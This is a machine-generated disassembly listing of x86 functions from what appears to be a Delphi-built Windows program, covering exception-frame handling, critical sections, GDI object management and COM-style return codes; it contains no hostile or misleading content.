sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_4176cc
push ebx
mov ebx eax
mov eax ebx
call sub_419080
cmp al 0x9
sete al
pop ebx
retn
sub_41772b
jmp sub_403a98
sub_417732
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4177d8
jmp sub_403a98
sub_4177df
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417a5e
jmp sub_4037e4
sub_417a8a
jmp sub_4037e4
sub_417b2c
jmp sub_4037e4
sub_417bcf
jmp sub_4037e4
sub_417da7
jmp sub_4037e4
sub_417de9
jmp sub_403a98
sub_417e19
jmp sub_403a98
sub_417e20
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417e8f
jmp sub_403a98
sub_417f66
jmp sub_403a98
sub_417f6d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418240
mov dl 0x1
call sub_4171a8
retn
sub_418381
jmp sub_403a98
sub_418388
pop ebx
mov esp ebp
pop ebp
retn
sub_418390
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_419190
mov eax [ rw-data ]
call sub_417104
pop ebp
retn
j_sub_403910#2
jmp sub_403910
j_sub_403910#3
jmp sub_403910
sub_41857c
jmp sub_403a98
sub_418583
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418663
jmp sub_403a98
sub_41866a
mov esp ebp
pop ebp
retn
sub_418722
jmp sub_403a98
sub_418729
pop ecx
pop ecx
pop ebp
retn
sub_418a2b
jmp sub_403a98
sub_418a32
pop ebx
mov esp ebp
pop ebp
retn
sub_418cd7
jmp sub_403a98
sub_418cde
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403344
retn
sub_418cf7
jmp sub_403a98
sub_418d1b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4037e4
sub_418d52
jmp sub_4037e4
sub_418d91
jmp sub_403a98
sub_418d98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418dba
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_4040b8
retn
sub_418db3
jmp sub_403a98
sub_418dba
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418e41
jmp sub_4037e4
sub_418e6e
jmp sub_403a98
sub_418e75
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418e80
push ecx
mov edx esp
mov ecx 0x4
call sub_417644
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_417104
sub_418f8d
jmp sub_403a98
sub_418f94
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419073
jmp sub_403a98
sub_41907a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4190d0
jmp sub_403a98
sub_4190d7
pop ebx
pop ecx
pop ebp
retn
sub_41931f
jmp sub_403a98
sub_419326
pop ecx
pop ecx
pop ebp
retn
sub_419369
jmp sub_403a98
sub_419370
pop ebx
pop ecx
pop ebp
retn
sub_41940c
jmp sub_403a98
sub_419413
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4194c1
jmp sub_403a98
sub_4194c8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4194d4
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41972f
jmp sub_403a98
sub_419736
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41975b
mov eax [ ebp - 0x8 ]
call sub_403344
mov eax [ ebp - 0x4 ]
call sub_403344
retn
sub_419754
jmp sub_403a98
sub_41975b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419780
lea eax [ ebp - 0x1c ]
call sub_4057e0
lea eax [ ebp - 0x18 ]
call sub_404094
retn
sub_419779
jmp sub_403a98
sub_419780
pop ebx
mov esp ebp
pop ebp
retn
sub_419992
jmp sub_403a98
sub_419999
pop ebx
mov esp ebp
pop ebp
retn
sub_4199ec
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_4162b4
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_419a04
test dl dl
je r-xdata
mov dl 0x8
call sub_419b88
retn
mov dl 0x9
call sub_419b88
retn
sub_419a8c
mov dl 0x1
call sub_419b88
retn
sub_419a94
xor edx edx
call sub_419b88
retn
sub_419b79
jmp sub_403a98
sub_419b80
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419b9c
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40d144
sub_419bd0
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_419be8
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_419bf4
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_419be8
sub_419d1a
jmp sub_4037e4
sub_419d49
jmp sub_403a98
sub_419d7f
jmp sub_403a98
sub_419d86
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419da5
push rw-data
call LeaveCriticalSection
retn
sub_419d9e
jmp sub_403a98
sub_419da5
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419e74
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_41a050
sub_419ed4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_418190
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_419ee8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_418190
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_419efc
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_419a18
retn
sub_419f08
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_419a18
retn
sub_41a1b0
xor eax eax
retn
sub_41a1b4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41a1bc
xor eax eax
retn
sub_41a1c0
retn
sub_41a1c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4040e8
pop esi
pop ebx
retn
sub_41a1d8
mov eax [ eax + 0x4 ]
retn
sub_41a1dc
retn
sub_41a1e0
xor eax eax
retn
sub_41a1e4
retn
sub_41a1e8
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_41a1f4
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41a200
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41a20c
retn
sub_41a210
xchg edx eax
call sub_417e34
retn
sub_41a218
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_41a2a0
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403540
pop esi
retn
sub_41a2b4
retn
sub_41a394
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4040e8
pop esi
pop ebx
retn
sub_41a3d4
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41a520
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_40358c
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41a538
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41a5c0
retn
sub_41a608
retn
sub_41a640
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41a658
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41a87c
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403540
pop esi
pop ebx
retn
sub_41a6a0
mov al 0x1
retn
sub_41a6a4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41a6ac
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41a754
xor eax eax
retn
sub_41a758
retn
sub_41a784
retn
sub_41a81c
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41a830
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_414210
retn
sub_41a977
jmp sub_4037e4
sub_41a97c
mov ebx 0x1
call sub_403b4c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a9df
jmp sub_4037e4
sub_41a9e4
mov ebx 0x80030103
call sub_403b4c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41aa62
jmp sub_4037e4
sub_41aa67
mov ebx 0x80030009
call sub_403b4c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41aac5
jmp sub_4037e4
sub_41aaca
mov ebx 0x8000ffff
call sub_403b4c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41ac95
jmp sub_403a98
sub_41aca6
jmp sub_4037e4
sub_41acab
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41acd4
lea eax [ ebp + 0xc ]
call sub_4057e0
retn
sub_41accd
jmp sub_403a98
sub_41acd4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41ace0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41acec
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41acf8
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41ad04
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41ad73
jmp sub_4037e4
sub_41ad78
mov esi 0x8000ffff
call sub_403b4c
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41ad8c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41adf9
jmp sub_403a98
sub_41ae00
mov eax [ rw-data ]
call sub_403344
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41ae10
call sub_413b5c
retn
sub_41aed8
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41b07c
jmp sub_403a98
sub_41b083
pop ebp
retn
sub_41b111
jmp sub_403a98
sub_41b118
pop ebp
retn
sub_41b451
jmp sub_403a98
sub_41b458
pop ebp
retn
sub_41b45c
sub [ rw-data ] 0x1
retn
sub_41be2c
push es
mov esi 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_41bf19
add eax 0xffffffd8
jmp sub_4206c8
sub_41bf21
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_41c444
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41c4b8
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41c52c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41c538
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41c618
jmp sub_403a98
sub_41c61f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c6af
jmp sub_403a98
sub_41c741
jmp sub_403a98
sub_41c748
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c7ac
jmp sub_403a98
sub_41c7b3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c81b
jmp sub_403a98
sub_41c822
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c8c5
jmp sub_403a98
sub_41c8cc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41cd24
push 0x33
mov ecx rw-data
call sub_413e1c
retn
sub_41cd34
push 0x33
mov ecx rw-data
call sub_413ddc
retn
sub_41cd44
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41cd68
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41cf3c
push 0x11
mov ecx rw-data
call sub_413ddc
retn
sub_41d07c
push ebx
mov ebx eax
mov eax ebx
call sub_41cd44
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d136
jmp sub_403a98
sub_41d13d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cd68
retn
sub_41d153
jmp sub_403a98
sub_41d16c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41d1c9
jmp sub_403a98
sub_41d1d0
pop ebx
pop ecx
pop ebp
retn
sub_41d349
jmp sub_403a98
sub_41d371
jmp sub_403a98
sub_41d378
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41d3e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4042f8
pop esi
pop ebx
retn
sub_41d458
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41d3b4
push eax
call sub_4062e4
neg eax
pop ebx
retn
sub_41d494
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41d4cc
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41d4fc
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41d61a
jmp sub_403a98
sub_41d621
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cd68
retn
sub_41d637
jmp sub_403a98
sub_41d6ad
jmp sub_403a98
sub_41d6b4
pop ebx
pop ecx
pop ebp
retn
sub_41d76e
jmp sub_403a98
sub_41d8f3
jmp sub_403a98
sub_41d8fa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cd68
retn
sub_41d910
jmp sub_403a98
sub_41d989
jmp sub_403a98
sub_41d990
pop ebx
pop ecx
pop ebp
retn
sub_41dac9
jmp sub_403a98
sub_41de50
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41e0f8
jmp sub_403a98
sub_41e0ff
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41e108
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41e140
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41e14c
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41e2b0
retn
sub_41e379
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41e390
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41e47c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41e49c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41e4bc
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41e4dc
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
pop ebx
retn
sub_41e4f4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
pop ebx
retn
sub_41e518
mov eax [ rw-data ]
call sub_41e4f4
retn
sub_41e57a
jmp sub_403a98
sub_41e581
pop ecx
pop ebp
retn
sub_41e620
jmp sub_403a98
sub_41e627
pop ebx
mov esp ebp
pop ebp
retn
sub_41e6f9
jmp sub_403a98
sub_41e78a
jmp sub_403a98
sub_41e791
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e7bc
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41e8a3
jmp sub_403a98
sub_41ea50
jmp sub_403a98
sub_41ea57
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41ec69
jmp sub_403a98
sub_41ec70
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41ed0a
jmp sub_403a98
sub_41eee6
jmp sub_403a98
sub_41efa0
jmp sub_403a98
sub_41efa7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41efc7
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41efc0
jmp sub_403a98
sub_41efc7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41f155
jmp sub_403a98
sub_41f320
jmp sub_403a98
sub_41f327
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f34a
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_402714
retn
sub_41f343
jmp sub_403a98
sub_41f34a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f36a
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_402714
retn
sub_41f363
jmp sub_403a98
sub_41f36a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41f374
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_41f4d4
push 0x0
call sub_41f470
retn
sub_41f579
jmp sub_403a98
sub_41f580
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41f58c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41f4dc
pop ebx
pop ebp
retn 0x4
sub_41f5a0
retn
sub_41f5a4
test eax eax
jne r-xdata
retn
call sub_41f5a0
sub_41f777
jmp sub_403a98
sub_41f79e
jmp sub_403a98
sub_41f7a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f7e4
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41f9b1
mov eax [ ebp - 0xc ]
call sub_403344
retn
sub_41f9ba
jmp sub_403a98
j_sub_41f9b1
jmp sub_41f9b1
sub_41f9c1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403344
retn
sub_41f9d7
jmp sub_403a98
sub_41f9e8
xor eax eax
retn
sub_41f9ec
mov al [ eax + 0x21 ]
retn
sub_41fa38
jmp sub_403a98
sub_41fa3f
pop esi
pop ecx
pop ebp
retn
sub_41fa6c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41fac3
jmp sub_403a98
sub_41faca
pop esi
pop ecx
pop ebp
retn
sub_41fad0
retn
sub_41fad4
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41fae4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41fc69
jmp sub_403a98
sub_41fc70
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41fd8f
jmp sub_403a98
sub_41fd96
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41fe27
jmp sub_403a98
sub_41fe2e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41feb6
jmp sub_403a98
sub_41febd
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420047
jmp sub_403a98
sub_42004e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_420204
jmp sub_4037e4
sub_420264
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb8c
mov [ rw-data ] eax
sub_420284
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_420114
mov [ rw-data ] eax
sub_4203ac
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_420348
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_420454
jmp sub_4037e4
sub_420537
jmp sub_4037e4
sub_420598
jmp sub_403a98
sub_42059f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42061f
jmp sub_4037e4
sub_420698
push ebx
mov ebx edx
call sub_420284
mov edx ebx
call sub_420228
test eax eax
setne al
pop ebx
retn
sub_4206b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4203ac
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_4206c8
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4203ac
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_420811
jmp sub_4037e4
sub_42088f
jmp sub_403a98
sub_420896
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420a30
retn
sub_420bd0
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_420ed4
jmp sub_403a98
sub_420edb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421053
jmp sub_403a98
sub_42105a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4210e9
jmp sub_403a98
sub_4210f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421112
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040b8
retn
sub_42110b
jmp sub_403a98
sub_421112
pop ebx
mov esp ebp
pop ebp
retn
sub_421125
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_42140c
jmp r-xdata
retn
sub_42113b
call sub_421498
retn
sub_421230
retn
sub_421488
jmp sub_403a98
sub_4215b3
jmp sub_403a98
sub_4215ba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_4215d3
jmp sub_403a98
sub_4217aa
jmp sub_403a98
sub_4217d2
jmp sub_403a98
sub_4217d9
mov esp ebp
pop ebp
retn
sub_421850
jmp sub_403a98
sub_421958
jmp sub_403a98
sub_421a43
jmp sub_403a98
sub_421a50
inc [ eax + 0x4 ]
retn
sub_421bcb
jmp sub_403a98
sub_421f7c
jmp sub_403a98
sub_4221c6
jmp sub_403a98
sub_4221f0
jmp sub_403a98
sub_4221f7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422219
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_422212
jmp sub_403a98
sub_422223
jmp sub_4037e4
sub_422272
jmp sub_403a98
sub_42249f
jmp sub_403a98
sub_4224e7
jmp sub_403a98
sub_422654
jmp sub_403a98
sub_42271b
jmp sub_4037e4
sub_422770
mov [ eax + 0x31 ] 0x0
call sub_41f7e4
retn
sub_4229c1
jmp sub_403a98
sub_422a2c
jmp sub_403a98
sub_422a33
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422aa4
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_422b58
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_422b68
push ebx
mov ebx eax
mov eax ebx
call sub_422d20
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_422b7c
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_422b98
push ebx
mov ebx eax
mov eax ebx
call sub_422d80
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_422bf4
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_422d03
jmp sub_403a98
sub_422f34
jmp sub_403a98
sub_422f3b
pop ebx
pop ecx
pop ebp
retn
sub_422fc7
jmp sub_4037e4
sub_423027
jmp sub_403a98
sub_42302e
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42340f
jmp sub_403a98
sub_42343b
jmp sub_403a98
sub_4234a2
jmp sub_4037e4
sub_4234d3
jmp sub_403a98
sub_423558
jmp sub_4037e4
sub_42355d
mov eax [ ebp - 0x38 ]
call sub_403344
call sub_403af8
call sub_403b4c
sub_42356f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42358c
mov eax [ ebp - 0x18 ]
call sub_402714
retn
sub_423585
jmp sub_403a98
sub_4236db
jmp sub_4037e4
sub_4239a7
jmp sub_4037e4
sub_423a88
mov cl 0x1
call sub_423a90
retn
sub_423d45
add [ eax ] al
add [ ebx ] dh
leave
call sub_423a90
retn
sub_423dca
jmp sub_4037e4
sub_423dcf
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403af8
call sub_403b4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_423e20
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_423f59
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_423f88
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_423f9c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_4240b5
jmp sub_4037e4
sub_42416a
jmp sub_4037e4
sub_4241d4
jmp sub_4037e4
sub_424208
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_424194
mov edx ebx
mov eax ebx
mov ecx [ eax ]
